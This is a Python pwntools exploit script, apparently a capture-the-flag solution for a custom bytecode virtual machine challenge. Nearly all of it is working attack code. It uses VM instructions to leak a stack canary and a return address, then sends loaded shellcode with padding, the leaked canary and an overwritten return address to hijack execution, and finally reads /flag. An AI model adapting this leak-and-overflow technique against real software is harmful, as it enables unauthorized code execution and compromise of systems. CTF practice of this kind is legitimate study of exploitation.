#!/usr/bin/python3
from pwn import *
from sys import exit

context.binary = binary = ELF("", checksec=False)
context.log_level = "critical"
bp = ""
pack = make_packer("all")

'''
mov = 0x04
add = 0x40
stk = 0x01
stm = 0x20
ldm = 0x10
cmp = 0x02
jmp = 0x80
sys = 0x08
    
0x404 rsp = 0x02
0x405 rip = 0x10
0x400   a = 0x40
0x401   b = 0x01
0x402   c = 0x08
0x403   d = 0x20
0x406   f = 0x04
'''

#[op][value][register]

def load_shellcode():
    with open("asm/chmodtext", "rb") as f:
        shellcode = bytes(f.read())
        f.close()
        return shellcode

def _compile():
    shellcode = ""
    shellcode += "040140" # mov a = 01
    shellcode += "04ff01" # mov b = ff
    shellcode += "043008" # mov c = 30
    shellcode += "080404" # write(stdout, code_base + 0x300 + 0xff, 0x30)
    shellcode += "040040" # mov a = 00
    shellcode += "04d001" # mov b = d0
    shellcode += "04ff08" # mov c = ff
    shellcode += "080420" # read(0, code_base + 0x300 + 0xd0, 255)
    print("size:", str(int(len(shellcode))))
    return bytes.fromhex(shellcode.rstrip())
   
def stage2(canary,retadr):
    shellcode = load_shellcode()
    shellcode += bytes.fromhex("41" * 32)
    shellcode += p64(int(canary, 16))
    shellcode += bytes.fromhex("00" * 8)
    shellcode += pack(int(retadr, 16) - 0x138)
    return shellcode

def runner():
    p = process()
    code = _compile()
    p.recv()
    p.send(code)
    
    values = p.recv()
    values = int.from_bytes(values, byteorder="little")
    retadr = hex(values)[:14]
    canary = "0x" + (hex(values)[:-18][-16:])
    print(f"[r] {retadr}")
    print(f"[c] {canary}")
    
    p.send(stage2(canary,retadr))
    print(p.recv())
    p.close()
    p.kill()

if __name__ == '__main__':
    runner()
    try:
        with open("/flag", "r") as f:
            print(f.read())
            f.close()
    except:
        print("[!] Failed :(")
